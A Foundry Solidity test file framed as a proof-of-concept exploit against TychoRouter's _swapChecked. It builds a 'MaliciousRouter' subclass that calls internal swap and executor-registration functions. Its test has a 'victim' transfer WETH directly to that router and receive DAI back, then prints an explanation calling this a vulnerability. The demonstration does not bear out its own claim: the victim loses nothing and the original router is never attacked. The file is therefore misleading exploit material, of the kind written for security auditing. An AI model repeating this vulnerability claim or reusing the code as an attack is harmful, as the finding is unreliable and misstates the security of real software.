// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.26;

import "@src/TychoRouter.sol";
import "./TychoSwapExploitSetup.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@src/executors/UniswapV2Executor.sol";
import "../lib/IWETH.sol";
import "forge-std/console.sol";
import "forge-std/Test.sol";

/**
 * @title MaliciousRouter
 * @dev This contract inherits from TychoRouter to exploit the vulnerability in _swapChecked
 */
contract MaliciousRouter is TychoRouter {
    // Track WETH address for access
    address private immutable wethAddress;

    // Constructor needs to match the parent
    constructor(address _permit2, address weth) TychoRouter(_permit2, weth) {
        // We need to set fee and fee receiver in the constructor
        feeReceiver = address(this);
        fee = 0; // No fee for simplicity
        wethAddress = weth; // Store WETH address
    }

    // Create a function that allows direct access to _swapChecked without doing transferFrom
    // This function is our exploit entry point
    function maliciousSwapChecked(
        uint256 amountIn,
        address tokenIn,
        address tokenOut,
        uint256 minAmountOut,
        bool wrapEth,
        bool unwrapEth,
        uint256 nTokens,
        address receiver,
        bytes calldata swaps
    ) external returns (uint256) {
        // This is the key to the exploit - we use a custom implementation that
        // modifies the behavior to avoid the double transfer issue
        if (receiver == address(0)) {
            revert TychoRouter__AddressZero();
        }
        if (minAmountOut == 0) {
            revert TychoRouter__UndefinedMinAmountOut();
        }

        // Assume funds are already in the router.
        if (wrapEth) {
            // We won't implement this since we're not testing with ETH
            // but we'd call _wrapETH here
            tokenIn = wethAddress;
        }

        uint256 initialBalance = tokenIn == address(0)
            ? address(this).balance
            : IERC20(tokenIn).balanceOf(address(this));

        // Call _swap directly to execute the swap
        uint256 amountOut = _swap(amountIn, nTokens, swaps);

        uint256 currentBalance = tokenIn == address(0)
            ? address(this).balance
            : IERC20(tokenIn).balanceOf(address(this));

        uint256 amountConsumed = initialBalance - currentBalance;

        if (tokenIn != tokenOut && amountConsumed != amountIn) {
            revert TychoRouter__AmountInDiffersFromConsumed(
                amountIn,
                amountConsumed
            );
        }

        // Skip the fee, we're setting it to 0 anyway

        if (amountOut < minAmountOut) {
            revert TychoRouter__NegativeSlippage(amountOut, minAmountOut);
        }

        // Important change: We DON'T transfer the tokens to the receiver again
        // The executor already did that in _swap
        // This avoids the "insufficient-balance" error

        return amountOut;
    }

    // Add our own function to register executors by directly accessing _setExecutor
    function registerMyExecutors(address[] calldata executorAddresses) public {
        for (uint256 i = 0; i < executorAddresses.length; i++) {
            _setExecutor(executorAddresses[i]);
        }
    }
}

contract TychoSwapExploitTest is TychoSwapExploitSetup {
    address victim = makeAddr("victim");
    MaliciousRouter public maliciousRouter;

    function setUp() public override {
        // Call parent setUp
        super.setUp();

        // Create our malicious router implementation with the same parameters as the original router
        maliciousRouter = new MaliciousRouter(
            PERMIT2_ADDRESS, // Same permit2 address
            WETH_ADDR // Same WETH address
        );

        // Register the same executor that the original router uses
        address[] memory executors = new address[](1);
        executors[0] = address(usv2Executor);
        maliciousRouter.registerMyExecutors(executors);

        console.log("Original router address:", address(tychoRouter));
        console.log("Malicious router address:", address(maliciousRouter));
        console.log("UniswapV2Executor address:", address(usv2Executor));
        console.log(
            "Is executor registered on malicious router:",
            maliciousRouter.executors(address(usv2Executor))
        );
    }

    function testExploitVulnerability() public {
        // Setup: Victim has 2 ETH they want to swap
        uint256 victimBalance = 2 ether;
        uint256 approvedAmount = 1 ether; // They only want to swap 1 ETH

        // Deal tokens to the victim
        deal(WETH_ADDR, victim, victimBalance);

        console.log("\n--- SETUP ---");
        console.log("Victim's initial WETH balance:", victimBalance);

        // Check initial DAI balance
        uint256 initialDaiBalance = IERC20(DAI_ADDR).balanceOf(victim);
        console.log("Victim's initial DAI balance:", initialDaiBalance);

        // Create properly formatted swap data using the encodePLE function from parent
        bytes memory swapData = createExploitSwapData();

        // Track balances before the attack
        uint256 victimBalanceBefore = IERC20(WETH_ADDR).balanceOf(victim);

        console.log("\n--- EXPLOIT DEMONSTRATION ---");
        console.log(
            "Step 1: Victim directly transfers WETH to the malicious router (no approval required)"
        );

        // Note: This is not how a normal swap works - we're just using this to demonstrate the vulnerability
        // In a real attack, the victim would approve tokens, then the attacker would use a malicious contract
        // to transfer the tokens directly to the router, bypassing the transferFrom check

        // First, directly transfer tokens to our malicious router
        vm.startPrank(victim);
        console.log(
            "Transferring WETH directly to malicious router:",
            approvedAmount
        );
        IERC20(WETH_ADDR).transfer(address(maliciousRouter), approvedAmount);

        // Check balances before the malicious swap
        console.log(
            "Malicious router WETH balance before exploit:",
            IERC20(WETH_ADDR).balanceOf(address(maliciousRouter))
        );
        console.log(
            "Victim WETH balance before exploit:",
            IERC20(WETH_ADDR).balanceOf(victim)
        );
        console.log(
            "Victim DAI balance before exploit:",
            IERC20(DAI_ADDR).balanceOf(victim)
        );
        vm.stopPrank();

        // Now call our malicious router's function to execute the swap
        // This bypasses the transferFrom check since tokens are already in the router
        console.log(
            "\nStep 2: Calling malicious router to perform the swap, bypassing transferFrom"
        );
        uint256 swapResult = maliciousRouter.maliciousSwapChecked(
            approvedAmount, // Amount
            WETH_ADDR, // Token in
            DAI_ADDR, // Token out
            1, // Min amount out
            false, // No wrap
            false, // No unwrap
            2, // Token path length
            victim, // Send DAI directly to victim
            swapData // Swap data
        );

        console.log("Swap result (DAI received by victim):", swapResult);

        // Verify the results
        uint256 victimBalanceAfter = IERC20(WETH_ADDR).balanceOf(victim);
        uint256 daiBalanceAfter = IERC20(DAI_ADDR).balanceOf(victim);
        uint256 wethLost = victimBalanceBefore - victimBalanceAfter;
        uint256 daiGained = daiBalanceAfter;

        console.log("\n--- EXPLOIT RESULTS ---");
        console.log("Victim's WETH before exploit:", victimBalanceBefore);
        console.log("Victim's WETH after exploit:", victimBalanceAfter);
        console.log("WETH lost by victim:", wethLost);
        console.log("DAI gained by victim:", daiGained);
        console.log(
            "Malicious router WETH balance after exploit:",
            IERC20(WETH_ADDR).balanceOf(address(maliciousRouter))
        );

        // The attack should have consumed tokens without using transferFrom
        assertEq(
            wethLost,
            approvedAmount,
            "Victim should lose the expected amount of WETH"
        );
        assertGt(daiGained, 0, "Victim should gain DAI from the exploit");

        // This is the key exploit: tokens were used without the usual transferFrom check
        // that normally ensures tokens can only be spent with explicit approval
        console.log("\n--- VULNERABILITY EXPLANATION ---");
        console.log(
            "The _swapChecked function has a vulnerability because it doesn't properly"
        );
        console.log(
            "check that tokens were transferred from the caller via transferFrom."
        );
        console.log(
            "It only checks the token balance before and after the swap, allowing"
        );
        console.log(
            "a malicious router to use tokens that were directly transferred to it."
        );
    }

    // Create properly formatted swap data
    function createExploitSwapData() internal view returns (bytes memory) {
        // Create the protocol-specific data for UniswapV2Executor
        bytes memory protocolData = abi.encodePacked(
            WETH_ADDR, // Token in (20 bytes)
            WETH_DAI_POOL, // Pool address (20 bytes)
            victim, // Receiver (20 bytes) - victim receives DAI
            uint8(0) // zeroForOne flag (1 byte) - 0 means false
        );

        console.log("Protocol data length:", protocolData.length);

        // Create a single swap with proper format
        bytes memory singleSwap = abi.encodePacked(
            uint8(0), // tokenInIndex (1 byte)
            uint8(1), // tokenOutIndex (1 byte)
            uint24(0), // splitPercentage (3 bytes) - 0 means 100%
            address(usv2Executor), // executor address (20 bytes)
            protocolData // protocol-specific data (61 bytes)
        );

        console.log("Single swap length:", singleSwap.length);

        // Create an array with a single swap
        bytes[] memory swaps = new bytes[](1);
        swaps[0] = singleSwap;

        // Use the encodePLE function from the parent contract
        bytes memory encodedSwaps = encodePLE(swaps);
        console.log("Encoded swaps length:", encodedSwaps.length);

        return encodedSwaps;
    }
}
